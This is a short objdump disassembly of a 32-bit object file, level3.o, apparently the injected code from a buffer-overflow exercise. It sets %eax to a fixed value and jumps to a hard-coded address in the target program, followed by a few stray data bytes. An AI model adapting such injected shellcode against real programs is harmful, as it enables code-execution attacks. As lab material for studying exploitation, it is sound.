
level3.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:	b8 e9 18 db 76       	mov    $0x76db18e9,%eax
   5:	be 1e 90 04 08       	mov    $0x804901e,%esi
   a:	ff e6                	jmp    *%esi
   c:	6c                   	insb   (%dx),%es:(%edi)
   d:	b1 ff                	mov    $0xff,%cl
   f:	ff                   	.byte 0xff
